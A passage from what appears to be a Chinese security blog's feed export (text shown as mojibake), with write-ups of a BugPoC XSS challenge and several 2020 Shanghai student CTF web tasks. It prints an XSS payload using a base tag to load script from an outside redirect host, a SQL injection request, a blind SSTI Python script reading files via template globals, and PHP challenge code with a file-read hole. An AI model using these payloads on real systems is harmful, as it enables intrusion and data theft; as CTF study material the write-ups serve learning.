<p><a href="https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html" target="_blank" rel="noopener">weblogicä¸‹è½½</a></p>
<p><a href="jianshu.com/p/75344ad2aaff">ubuntuå»ºç«‹æ–°ç”¨æˆ·æ²¡æœ‰å®¶ç›®å½•çš„é—®é¢˜ä¸æˆäºˆsudoæƒé™</a></p>
<p><a href="https://hub.docker.com/layers/vulhub/weblogic/10.3.6.0-2017/images/sha256-275ec19477cfda389dc1c42158033e7e8c650dd4cba9f090ca0ba673902b73c9?context=explore" target="_blank" rel="noopener">vulhub/weblogic:10.3.6.0-2017</a></p>
]]></content>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡xss-challengeçš„å¤ç°</title>
    <url>/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>çœ‹äº†ä¸€ç¯‡xssçš„å¸–å­ï¼Œè‡ªå·±å¯¹xssæ–¹é¢æ¯”è¾ƒåƒåœ¾ï¼Œè·Ÿç€æ–‡ç« å­¦ä¹ ä¸€ä¸‹</p>
<a id="more"></a>

<p>é¢˜ç›®é“¾æ¥</p>
<p><a href="https://wacky.buggywebsite.com/" target="_blank" rel="noopener">https://wacky.buggywebsite.com/</a></p>
<p>é¢˜ç›®ç•Œé¢</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194444163.png" alt="image-20201118194444163"></p>
<p>å¤§è‡´çš„åŠŸèƒ½å°±æ˜¯å¯ä»¥å°†è¾“å…¥çš„å­—ç¬¦è¿›è¡Œâ€ç¾åŒ–â€œï¼Œå…¶å®å°±æ˜¯æ¢äº†ä¸ªé¢œè‰²ã€‚ã€‚ã€‚ã€‚ç„¶åå³é”®æŸ¥çœ‹æºä»£ç ï¼Œæœ‰ä¸€ä¸ª<code>&lt;iframe&gt;</code>æ ‡ç­¾ï¼Œè®¿é—®å¯¹åº”çš„é“¾æ¥ï¼Œ</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201118194630150.png" alt="image-20201118194630150"></p>
<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119101858849.png" alt="image-20201119101858849" style="zoom:200%;">

<p>æç¤ºå½“å‰é¡µé¢åªèƒ½åœ¨iframeé‡Œé¢çœ‹ï¼Œç„¶åå³é”®æŸ¥çœ‹æºä»£ç ï¼Œå…¶ä¸­å…³é”®çš„ä¸€æ®µå¦‚ä¸‹ï¼Œ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"ygdsnjslxhwp"</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">		<span class="built_in">window</span>.fileIntegrity = <span class="built_in">window</span>.fileIntegrity || &#123;</span></span><br><span class="line"><span class="actionscript">			<span class="string">'rfc'</span> : <span class="string">' https://w3c.github.io/webappsec-subresource-integrity/'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'algorithm'</span> : <span class="string">'sha256'</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'value'</span> : <span class="string">'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E='</span>,</span></span><br><span class="line"><span class="actionscript">			<span class="string">'creationtime'</span> : <span class="number">1602687229</span></span></span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"><span class="actionscript">		<span class="comment">// verify we are in an iframe</span></span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">window</span>.name == <span class="string">'iframe'</span>) &#123;</span></span><br><span class="line">			</span><br><span class="line"><span class="actionscript">			<span class="comment">// securely load the frame analytics code</span></span></span><br><span class="line">			if (fileIntegrity.value) &#123;</span><br><span class="line">				</span><br><span class="line"><span class="actionscript">				<span class="comment">// create a sandboxed iframe</span></span></span><br><span class="line"><span class="javascript">				analyticsFrame = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'sandbox'</span>, <span class="string">'allow-scripts allow-same-origin'</span>);</span></span><br><span class="line"><span class="actionscript">				analyticsFrame.setAttribute(<span class="string">'class'</span>, <span class="string">'invisible'</span>);</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.body.appendChild(analyticsFrame);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">				<span class="comment">// securely add the analytics code into iframe</span></span></span><br><span class="line"><span class="javascript">				script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'src'</span>, <span class="string">'files/analytics/js/frame-analytics.js'</span>);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'integrity'</span>, <span class="string">'sha256-'</span>+fileIntegrity.value);</span></span><br><span class="line"><span class="actionscript">				script.setAttribute(<span class="string">'crossorigin'</span>, <span class="string">'anonymous'</span>);</span></span><br><span class="line">				analyticsFrame.contentDocument.body.appendChild(script);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.body.innerHTML = <span class="string">`</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">h2</span>&gt;</span>This page can only be viewed from an iframe.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"400"</span> <span class="attr">controls</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">				<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;/<span class="name">video</span>&gt;</span>`</span></span></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åªæœ‰åœ¨<code>window.name</code>ä¸º<code>iframe</code>æ—¶æ‰ä¼šåˆ›å»ºä¸€ä¸ª<code>iframe</code>æ ‡ç­¾ï¼Œåªå¯ä»¥é€šè¿‡å¦‚ä¸‹<code>payload</code>æ¥ç»•è¿‡ï¼Œ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="actionscript">location.href = <span class="string">"https://wacky.buggywebsite.com/frame.html?param=xss"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¹¶åœ¨<code>&lt;iframe&gt;</code>æ ‡ç­¾ä¸­æ·»åŠ äº†<code>sandbox</code>å±æ€§ï¼Œ</p>
<blockquote>
<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119142538319.png" alt="image-20201119142538319" style="zoom:150%;">
</blockquote>
<p>ä¹‹åè¿˜ä¼šæ·»åŠ ä¸€ä¸ª<code>script</code>æ ‡ç­¾åˆ°å…¶ä¸­ï¼Œå…¶ä¸­srcæ˜¯é‡‡ç”¨çš„ç›¸å¯¹è·¯å¾„ï¼Œè¿˜åˆ©ç”¨äº†<code>integrity</code>æ¥ç¡®ä¿èµ„æºçš„å®Œæ•´æ€§ã€‚ä¹‹åæˆ‘ä»¬å¯»æ‰¾<code>https://wacky.buggywebsite.com/frame.html?param=xss</code>é“¾æ¥ä¸­çš„xssæ³¨å…¥ç‚¹ï¼Œå‘ç°å¯ä»¥é€šè¿‡<code>&lt;/title&gt;</code>æ ‡ç­¾æ¥é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œç„¶åæ’å…¥htmlä»£ç ï¼Œ</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119105856645.png" alt="image-20201119105856645"></p>
<p>ä½†æ˜¯å› ä¸ºå­˜åœ¨CSPï¼Œä¸èƒ½æ‰§è¡Œ</p>
<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110041168.png" alt="image-20201119110041168"></p>
<p>æŸ¥çœ‹å¯¹åº”çš„CSP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script-src &#39;nonce-syvmzvejfjgs&#39; &#39;strict-dynamic&#39;; frame-src &#39;self&#39;; object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119110704352.png" alt="image-20201119110704352"></p>
<p>å¯ä»¥æ’å…¥<code>&lt;base&gt;</code>æ ‡ç­¾ï¼Œurlå®šä¹‰ä¸ºæˆ‘ä»¬è‡ªå·±çš„VPSï¼Œç„¶ååœ¨<code>files/analytics/js/frame-analytics.js</code>ä¸­æ’å…¥xssä»£ç ï¼Œå› ä¸ºæºç ä¸­æ˜¯å°†<code>window.fileIntegrity.value</code>æ¥å½“<code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>integrity</code>å€¼ï¼Œå¦‚ä¸‹<img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119111714068.png" alt="image-20201119111714068" style="zoom:200%;"></p>
<blockquote>
<h1 id="Subresource-Integrity"><a href="#Subresource-Integrity" class="headerlink" title="Subresource Integrity"></a>Subresource Integrity</h1><p><strong>å­èµ„æºå®Œæ•´æ€§</strong>(SRI)æ˜¯å…è®¸æµè§ˆå™¨æ£€æŸ¥å…¶è·å¾—çš„èµ„æºï¼ˆä¾‹å¦‚ä» <a href="https://developer.mozilla.org/en-US/docs/Glossary/CDN" target="_blank" rel="noopener">CDN</a> è·å¾—çš„ï¼‰æ˜¯å¦è¢«ç¯¡æ”¹çš„ä¸€é¡¹å®‰å…¨ç‰¹æ€§ã€‚å®ƒé€šè¿‡éªŒè¯è·å–æ–‡ä»¶çš„å“ˆå¸Œå€¼æ˜¯å¦å’Œä½ æä¾›çš„å“ˆå¸Œå€¼ä¸€æ ·æ¥åˆ¤æ–­èµ„æºæ˜¯å¦è¢«ç¯¡æ”¹ã€‚</p>
<p>å°†ä½¿ç”¨ base64 ç¼–ç è¿‡åçš„æ–‡ä»¶å“ˆå¸Œå€¼å†™å…¥ä½ æ‰€å¼•ç”¨çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script" target="_blank" rel="noopener"><code>&lt;script&gt;</code></a> æˆ– <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" target="_blank" rel="noopener"><code>&lt;link&gt;</code></a> æ ‡ç­¾çš„ <strong>integrity</strong> å±æ€§å€¼ä¸­å³å¯å¯ç”¨å­èµ„æºå®Œæ•´æ€§åŠŸèƒ½ã€‚</p>
<p>integrity å€¼åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æŒ‡å®šå“ˆå¸Œå€¼çš„ç”Ÿæˆç®—æ³•ï¼ˆç›®å‰æ”¯æŒ sha256ã€sha384 åŠ sha512ï¼‰ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯ç»è¿‡ base64 ç¼–ç çš„å®é™…å“ˆå¸Œå€¼ï¼Œä¸¤è€…ä¹‹é—´é€šè¿‡ä¸€ä¸ªçŸ­æ¨ªï¼ˆ-ï¼‰åˆ†å‰²ã€‚</p>
</blockquote>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡æ³¨å…¥ä¸‹é¢ä»£ç ç»•è¿‡ï¼Œ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'aErQrfRCGgdInIpMEDCWj2%2bHQUab648smjdgPAUdBKU='</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112037023.png" alt="image-20201119112037023"></p>
<p>åˆ©ç”¨BugPoCç”Ÿæˆpayloadã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"Access-Control-Allow-Origin"</span>:<span class="string">"*"</span>,</span><br><span class="line">	<span class="attr">"Content-type"</span>:<span class="string">"text/javascript"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112633325.png" alt></p>
<p>æœ€åpayload:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.name=<span class="string">"iframe"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">location.href = "https://wacky.buggywebsite.com/frame.html?param=<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">'fileIntegrity'</span> <span class="attr">value</span>=<span class="string">'QkIPs1Inueee8IH+HXpScbWfI0zPgWJvCB9LGWZH/Wc='</span>&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">'https://0vc3zrq6aqua.redir.bugpoc.ninja/'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1xss-challenge%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20201119112858083.png" alt="image-20201119112858083"></p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://jinone.github.io/BugPoc-XSS-Challenge/" target="_blank" rel="noopener">BugPoc XSS Challenge</a></p>
<p><a href="https://www.srihash.org/" target="_blank" rel="noopener">https://www.srihash.org/</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7</a></p>
]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›éƒ¨åˆ†wp</title>
    <url>/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&amp;miscWP/</url>
    <content><![CDATA[<p>2020ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›éƒ¨åˆ†wp</p>
<a id="more"></a>

<h1 id="åƒæ¯’ç½‘ç›˜"><a href="#åƒæ¯’ç½‘ç›˜" class="headerlink" title="åƒæ¯’ç½‘ç›˜"></a>åƒæ¯’ç½‘ç›˜</h1><p>è¿™é¢˜å¾ˆè¿·ï¼Œå¼€å§‹æ—¶å€™æ‰«äº†ä¸€æ¬¡ï¼Œæ²¡æœ‰æ‰«å‡ºæ¥<a href="http://www.zipï¼Œåæ¥å°±æ‰«å‡ºæ¥äº†" target="_blank" rel="noopener">www.zipï¼Œåæ¥å°±æ‰«å‡ºæ¥äº†</a></p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114193038409.png" alt="image-20201114193038409"></p>
<p>æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œè¿‡æ»¤äº†<code>&#39;</code> <code>union</code>ç­‰ï¼Œå¤§è‡´æ€è·¯æ˜¯é€šè¿‡ç¬¬ä¸€ä¸ªå¾ªç¯å°†<code>$_POST[&#39;code&#39;]</code>ç½®<code>NULL</code>æ‰ï¼Œé€šè¿‡<code>filter()</code>çš„è¿‡æ»¤ï¼Œç„¶åé€šè¿‡<code>extract($_GET,EXTR_SKIP);</code>ï¼Œç»™<code>$_POST[&#39;code&#39;]</code>é‡æ–°èµ‹å€¼ï¼Œè¿›è¡Œæ³¨å…¥ï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„è”åˆæ³¨å…¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?_POST[code]&#x3D;114514&#39;%20and%200%20union%20select%20user(),1,flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag%23 HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zehpt4jc1z3lyl83iz5.cloudeci1.ichunqiu.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.198 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: UM_distinctid&#x3D;1755a6e9ee915c-054346254fd387-303464-168000-1755a6e9eeaab8; chkphone&#x3D;acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O;_POST[code]&#x3D;1145</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">code&#x3D;1145</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114193454149.png" alt="image-20201114193454149"></p>
<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>è¯»å®Œæºç å¯çŸ¥ï¼Œ404é¡µé¢æœ‰SSTIï¼Œfuzzè¯»æ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡<code>/proc/self/fd/3</code>è¯»åˆ°åˆ é™¤çš„æ–‡ä»¶</p>
<p>ç„¶åç”¨è„šæœ¬ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://eci-2zegdefmmywv7mh25iet.cloudeci1.ichunqiu.com:8888/eee'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(payload)</span>:</span></span><br><span class="line">    postdata = payload</span><br><span class="line">    r = requests.post(url, data=postdata,headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>&#125;).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'1'</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">''</span></span><br><span class="line">s = <span class="string">r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-%'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#&#123;%if().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__['open']('/proc/self/fd/3').read()[:5]=="flag&#123;" %&#125;1&#123;% endif %&#125;</span></span><br><span class="line">        payload = <span class="string">'&#123;% if ().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[\'open\'](\'/proc/self/fd/3\').read()['</span>+str(i)+<span class="string">':'</span>+str(i+<span class="number">1</span>)+<span class="string">'] == "'</span>+c+<span class="string">'" %&#125;1&#123;% endif %&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194157205.png" alt="image-20201114194157205"></p>
<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>éƒ½é…ç½®æ–‡ä»¶</p>
<p><img src="/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&miscWP/image-20201114194615848.png" alt="image-20201114194615848"></p>
<p>å¾—åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œè¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">'/flag/is'</span>, $_GET[<span class="string">'file'</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> file_get_contents(<span class="string">'/'</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">                $user = <span class="keyword">new</span> user;</span><br><span class="line">                $login = $user-&gt;login();</span><br><span class="line">                <span class="keyword">if</span>($login)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="row clearfix"&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class="col-md-12 column"&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class="alert alert-dismissable alert-info"&gt;</span></span><br><span class="line"><span class="string">                                    &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;Ã—&lt;/button&gt;</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;</span></span><br><span class="line"><span class="string">                                        æ­å–œ!</span></span><br><span class="line"><span class="string">                                    &lt;/h4&gt; &lt;strong&gt;Success!&lt;/strong&gt;ç™»å½•æˆåŠŸäº†ï¼</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">                    &lt;br&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="container"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="row clearfix"&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class="col-md-12 column"&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class="alert alert-dismissable alert-danger"&gt;</span></span><br><span class="line"><span class="string">                                    &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;Ã—&lt;/button&gt;</span></span><br><span class="line"><span class="string">                                    &lt;h4&gt;</span></span><br><span class="line"><span class="string">                                        æ³¨æ„!</span></span><br><span class="line"><span class="string">                                    &lt;/h4&gt; &lt;strong&gt;Wrong!&lt;/strong&gt;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Need help?</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;!-- /?file=xxx è¯·ä½¿ç”¨ç»å¯¹è·¯å¾„--&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">'root'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">'qwertyu'</span>;</span><br><span class="line">    <span class="keyword">public</span> $database = <span class="string">'test'</span>;</span><br><span class="line">    <span class="keyword">private</span> $mysqli = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = mysqli_connect(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hostname,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line">        mysqli_select_db(<span class="keyword">$this</span>-&gt;mysqli,<span class="keyword">$this</span>-&gt;database);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_POST[<span class="string">'username'</span>] = addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $_POST[<span class="string">'password'</span>] = addslashes($_POST[<span class="string">'password'</span>]);</span><br><span class="line">        $safe1 = preg_match(<span class="string">'/inn|or/is'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        $safe2 = preg_match(<span class="string">'/inn|or/is'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($safe1 === <span class="number">0</span> <span class="keyword">and</span> $safe2 === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'No hacker!'</span>);</span><br><span class="line">        &#125;	    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter();</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        $sql = <span class="string">"select * from user where username='%s' and 